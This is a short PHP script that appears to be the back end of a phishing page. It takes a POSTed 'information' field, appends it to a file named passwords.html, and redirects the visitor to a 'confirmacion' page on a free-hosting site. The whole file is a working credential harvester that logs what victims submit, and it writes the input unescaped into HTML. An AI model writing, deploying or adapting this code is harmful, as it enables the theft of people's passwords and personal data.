<?php
	$info = $_POST['information'];
	$f = fopen("passwords.html", "a"); 
fwrite ($f, 'Info: [<b><font color="#EE0707">'.$info.'</font></b>] <br>');
fclose($f);

	header("Location: https://testduplydoge.000webhostapp.com/confirmacion.html");
?>